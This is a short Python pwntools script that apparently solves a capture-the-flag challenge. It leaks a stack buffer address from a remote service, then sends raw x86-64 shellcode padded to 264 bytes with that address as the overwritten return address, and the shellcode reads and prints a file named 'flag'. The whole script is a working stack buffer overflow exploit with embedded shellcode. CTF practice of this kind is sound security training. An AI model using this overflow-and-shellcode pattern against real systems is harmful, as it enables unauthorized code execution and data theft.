#!/usr/bin/env python
# -*- encoding: utf-8 -*-
LEN_BUFFER = 264 #Calculated using patterns in gef. could be automated

from pwn import *

context(arch = "amd64", os = "linux") #Challenge is on linux x64
conn = remote("challenges.unitedctf.ca", 17002) #connect to service

# parse buffer address
l = conn.recvline()
addr = int((l.split())[-1], 16)
ret_addr = p64(addr, endian="little", sign="unsigned")

# Adapted from http://shell-storm.org/shellcode/files/shellcode-878.php
shellcode = b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x41"

padding = b"A" * (LEN_BUFFER - len(shellcode))

conn.send(shellcode + padding + ret_addr + b"\n")
flag = conn.recvline().decode("utf-8")
print(flag)
